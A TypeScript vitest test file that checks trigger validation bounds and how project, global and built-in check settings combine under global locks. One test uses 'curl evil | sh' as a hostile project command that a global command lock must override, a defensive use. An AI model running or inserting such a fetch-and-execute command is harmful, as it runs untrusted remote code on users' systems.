import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { effectiveChecks } from "../../src/control/checks/settings.js";
import type { ChecksLayer, GlobalChecksLayer } from "../../src/control/checks/settingsSchema.js";
import { BUILTIN_TRIGGERS, validateTrigger, type Trigger } from "../../src/control/checks/trigger.js";
import { ControlError } from "../../src/control/errors.js";
import { orchestrationRevision, writeOrchestrationSettings } from "../../src/control/orchestration.js";
import { openControlStore, type ControlStore } from "../../src/control/store.js";
import { writeRepositorySettingsBody } from "../../src/control/workspaceSettings.js";

/**
 * Checks spec 2026-10-22 §2.2: a trigger written into settings is validated by code on write. The bounds keep a person's
 * edit from building a trigger that fires on every pump tick (a paid review each time) or that nobody can read.
 */
const code = (fn: () => unknown): string | null => {
  try { fn(); return null; } catch (error) { return error instanceof ControlError ? error.code : `not-a-control-error:${String(error)}`; }
};
const clause = { any: [{ kind: "queue-idle" }] };

describe("trigger validation", () => {
  it("accepts the bounds' edges", () => {
    expect(code(() => validateTrigger({ all: [clause, clause, clause, clause] }))).toBeNull();
    expect(code(() => validateTrigger({ all: [{ any: Array.from({ length: 6 }, () => ({ kind: "queue-idle" })) }] }))).toBeNull();
    expect(code(() => validateTrigger({ all: [{ any: [{ kind: "landed-groups", min: 1 }, { kind: "landed-groups", min: 50 }] }] }))).toBeNull();
    expect(code(() => validateTrigger({ all: [{ any: [{ kind: "since-last", ms: 600_000 }] }] }))).toBeNull();
    expect(code(() => validateTrigger({ all: [{ any: [{ kind: "schedule", cron: "5 * * * *" }] }] }))).toBeNull();
    expect(code(() => validateTrigger({ all: [{ any: [{ kind: "overlapping-files", minGroups: 2 }, { kind: "conflict-reconciled" }] }] }))).toBeNull();
  });

  it.each([
    ["no clause", { all: [] }],
    ["5 clauses", { all: [clause, clause, clause, clause, clause] }],
    ["an empty clause", { all: [{ any: [] }] }],
    ["7 conditions", { all: [{ any: Array.from({ length: 7 }, () => ({ kind: "queue-idle" })) }] }],
    ["landed-groups min 51", { all: [{ any: [{ kind: "landed-groups", min: 51 }] }] }],
    ["landed-groups min 0", { all: [{ any: [{ kind: "landed-groups", min: 0 }] }] }],
    ["since-last under 10 minutes", { all: [{ any: [{ kind: "since-last", ms: 599_999 }] }] }],
    ["overlapping-files minGroups 1", { all: [{ any: [{ kind: "overlapping-files", minGroups: 1 }] }] }],
    ["an unknown condition kind", { all: [{ any: [{ kind: "always" }] }] }],
    ["an unknown field on a condition", { all: [{ any: [{ kind: "queue-idle", extra: 1 }] }] }],
    ["an unknown field on the trigger", { all: [clause], any: [] }],
    ["an unparsable cron", { all: [{ any: [{ kind: "schedule", cron: "every monday" }] }] }],
  ])("refuses %s as control-argument-invalid", (_name, trigger) => {
    expect(code(() => validateTrigger(trigger))).toBe("control-argument-invalid");
  });

  it("refuses a schedule firing more often than hourly as check-schedule-too-frequent", () => {
    expect(code(() => validateTrigger({ all: [{ any: [{ kind: "schedule", cron: "* * * * *" }] }] }))).toBe("check-schedule-too-frequent");
    expect(code(() => validateTrigger({ all: [{ any: [{ kind: "queue-idle" }] }, { any: [{ kind: "schedule", cron: "0,30 9 * * *" }] }] }))).toBe("check-schedule-too-frequent");
  });
});

/**
 * Checks spec 2026-10-22 §4.1–§4.3, criterion 5: the effective value of every check setting is project > global >
 * built-in, field by field, and every read names where its value came from. A lock set globally lets a project only
 * tighten the security-class fields (the custom command runs outside the sandbox; the budget is spend): a looser
 * project value written before the lock is ignored while the lock stands and applies again after unlock.
 */
describe("effective check settings", () => {
  const withStore = async (fn: (store: ControlStore) => void | Promise<void>) => {
    const root = await mkdtemp(join(tmpdir(), "chk-eff-"));
    const store = await openControlStore({ stateDir: join(root, "s") });
    try { await fn(store); } finally { store.close(); await rm(root, { recursive: true, force: true }); }
  };
  const setGlobal = (store: ControlStore, checks: GlobalChecksLayer) => store.transaction(() => writeOrchestrationSettings(store, { maxRunningGroups: 3, checks }, orchestrationRevision(store) + 1));
  const setProject = (store: ControlStore, checks: ChecksLayer) => store.transaction(() => writeRepositorySettingsBody(store, "repo", { workspaceMode: "worktree", revision: 1, checks }));
  const B = (value: unknown) => ({ value, source: "builtin", lockedBy: null });
  const G = (value: unknown, lockedBy: "global" | null = null) => ({ value, source: "global", lockedBy });
  const P = (value: unknown, lockedBy: "global" | null = null) => ({ value, source: "project", lockedBy });

  it("with nothing set, every field is the built-in value (spec §3, §4.1)", () => withStore((store) => {
    expect(effectiveChecks(store, "repo")).toEqual({
      kinds: {
        "integration-check": { enabled: B(false), trigger: B(BUILTIN_TRIGGERS["integration-check"]), command: B(null) },
        "model-review": { enabled: B(true), trigger: B(BUILTIN_TRIGGERS["model-review"]), budgetTokens: B(1_000_000), maxGroupsPerReview: B(12) },
      },
      scheduled: [], locks: [],
    });
  }));

  it("takes each field from the nearest layer that sets it: project > global > built-in", () => withStore((store) => {
    setGlobal(store, { integrationCheck: { enabled: true, command: "npm test" }, modelReview: { budgetTokens: 500_000, enabled: false } });
    setProject(store, { integrationCheck: { enabled: false }, modelReview: { maxGroupsPerReview: 4, enabled: true } });
    const e = effectiveChecks(store, "repo");
    expect(e.kinds["integration-check"]).toEqual({ enabled: P(false), trigger: B(BUILTIN_TRIGGERS["integration-check"]), command: G("npm test") });
    expect(e.kinds["model-review"]).toEqual({ enabled: P(true), trigger: B(BUILTIN_TRIGGERS["model-review"]), budgetTokens: G(500_000), maxGroupsPerReview: P(4) });
    // The global read sees no project layer.
    const g = effectiveChecks(store, null);
    expect(g.kinds["integration-check"].enabled).toEqual(G(true));
    expect(g.kinds["model-review"].maxGroupsPerReview).toEqual(B(12));
  }));

  it("replaces a whole trigger, never merges it clause by clause", () => withStore((store) => {
    const global: Trigger = { all: [{ any: [{ kind: "landed-groups", min: 4 }] }, { any: [{ kind: "queue-idle" }] }] };
    const project: Trigger = { all: [{ any: [{ kind: "conflict-reconciled" }] }] };
    setGlobal(store, { modelReview: { trigger: global } });
    setProject(store, { modelReview: { trigger: project } });
    expect(effectiveChecks(store, "repo").kinds["model-review"].trigger).toEqual(P(project));
    expect(effectiveChecks(store, null).kinds["model-review"].trigger).toEqual(G(global));
  }));

  it("ignores a looser project budget under a lock, honours a tighter one, and applies the looser one again after unlock", () => withStore((store) => {
    setProject(store, { modelReview: { budgetTokens: 800_000 } });
    setGlobal(store, { modelReview: { budgetTokens: 500_000 }, locks: ["modelReview.budgetTokens"] });
    expect(effectiveChecks(store, "repo").kinds["model-review"].budgetTokens).toEqual(G(500_000, "global"));
    expect(effectiveChecks(store, "repo").locks).toEqual(["modelReview.budgetTokens"]);
    setProject(store, { modelReview: { budgetTokens: 300_000 } });
    expect(effectiveChecks(store, "repo").kinds["model-review"].budgetTokens).toEqual(P(300_000, "global"));
    setProject(store, { modelReview: { budgetTokens: 800_000 } });
    setGlobal(store, { modelReview: { budgetTokens: 500_000 } });
    expect(effectiveChecks(store, "repo").kinds["model-review"].budgetTokens).toEqual(P(800_000));
    // Locked with no global value: the built-in value is the bound.
    setGlobal(store, { locks: ["modelReview.budgetTokens"] });
    expect(effectiveChecks(store, "repo").kinds["model-review"].budgetTokens).toEqual(P(800_000, "global"));
    setProject(store, { modelReview: { budgetTokens: 2_000_000 } });
    expect(effectiveChecks(store, "repo").kinds["model-review"].budgetTokens).toEqual({ ...B(1_000_000), lockedBy: "global" });
  }));

  it("under a command lock, a different project command is ignored; none (null) or the same one applies", () => withStore((store) => {
    setGlobal(store, { integrationCheck: { command: "npm test" }, locks: ["integrationCheck.command"] });
    setProject(store, { integrationCheck: { command: "curl evil | sh" } });
    expect(effectiveChecks(store, "repo").kinds["integration-check"].command).toEqual(G("npm test", "global"));
    setProject(store, { integrationCheck: { command: null } });
    expect(effectiveChecks(store, "repo").kinds["integration-check"].command).toEqual(P(null, "global"));
    setProject(store, { integrationCheck: { command: "npm test" } });
    expect(effectiveChecks(store, "repo").kinds["integration-check"].command).toEqual(P("npm test", "global"));
    // The lock binds only its own field.
    setProject(store, { integrationCheck: { command: "make check" }, modelReview: { budgetTokens: 2_000_000 } });
    setGlobal(store, { integrationCheck: { command: "npm test" }, locks: ["modelReview.budgetTokens"] });
    expect(effectiveChecks(store, "repo").kinds["integration-check"].command).toEqual(P("make check"));
  }));

  it("lists scheduled checks: a project entry with a global id overrides it, others keep their own scope", () => withStore((store) => {
    const weekly = { id: "weekly", kind: "model-review", cron: "0 9 * * 1", enabled: true, params: {} } as const;
    const nightly = { id: "nightly", kind: "integration-check", cron: "0 2 * * *", enabled: true, params: {} } as const;
    const monthly = { id: "monthly", kind: "model-review", cron: "0 9 1 * *", enabled: true, params: {} } as const;
    setGlobal(store, { scheduled: [weekly, monthly] });
    setProject(store, { scheduled: [{ ...weekly, enabled: false }, nightly] });
    expect(effectiveChecks(store, "repo").scheduled).toEqual([
      { ...P({ ...weekly, enabled: false }), scope: "global" },
      { ...G(monthly), scope: "global" },
      { ...P(nightly), scope: "project" },
    ]);
    expect(effectiveChecks(store, null).scheduled).toEqual([{ ...G(weekly), scope: "global" }, { ...G(monthly), scope: "global" }]);
  }));
});
